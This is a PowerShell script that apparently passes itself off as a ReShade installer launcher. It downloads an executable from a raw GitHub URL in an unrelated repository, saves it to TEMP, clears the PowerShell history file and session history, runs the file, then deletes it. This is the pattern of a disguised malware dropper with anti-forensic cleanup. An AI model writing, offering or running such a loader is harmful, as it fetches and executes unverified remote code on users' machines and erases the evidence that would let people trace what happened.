$url = "https://raw.githubusercontent.com/phukancontract-dev/CMDSKYNET/refs/heads/main/ReShade_Setup_6.7.3.exe"

$tempPath = Join-Path $env:TEMP "ReShade_Setup_6.7.3.exe"

Write-Host "Downloading..." -ForegroundColor Cyan

try {
    Invoke-WebRequest `
        -Uri $url `
        -OutFile $tempPath `
        -ErrorAction Stop

    if (Test-Path $tempPath) {

        Write-Host "Download completed." -ForegroundColor Green

        # Clear PowerShell history
        try {
            $historyPath = (Get-PSReadLineOption).HistorySavePath

            if (Test-Path $historyPath) {
                Clear-Content -Path $historyPath
            }

            Clear-History

            Write-Host "History cleared." -ForegroundColor Yellow
        }
        catch {
            Write-Host "Could not clear history." -ForegroundColor Red
        }

        Write-Host "Launching installer..." -ForegroundColor Green

        Start-Process `
            -FilePath $tempPath `
            -Wait

        Write-Host "AFTER INSTALLER" -ForegroundColor Magenta

        Write-Host "Cleaning temporary files..." -ForegroundColor Yellow

        Remove-Item `
            -Path $tempPath `
            -Force `
            -ErrorAction SilentlyContinue

        Write-Host "Completed." -ForegroundColor Green
    }
    else {
        Write-Host "Download failed: file not found." -ForegroundColor Red
    }
}
catch {
    Write-Host "Error: $($_.Exception.Message)" -ForegroundColor Red
}
